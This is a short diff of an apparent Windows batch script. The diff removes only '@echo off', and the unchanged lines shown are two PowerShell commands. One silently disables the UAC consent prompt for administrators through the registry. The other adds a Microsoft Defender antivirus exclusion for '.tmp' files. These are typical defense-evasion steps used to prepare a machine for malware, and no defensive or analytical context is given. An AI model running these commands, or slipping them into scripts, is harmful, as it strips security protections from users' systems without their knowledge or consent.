@@ -1,5 +1,3 @@
-@echo off
-
 powershell.exe Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
 
 powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension ".tmp"
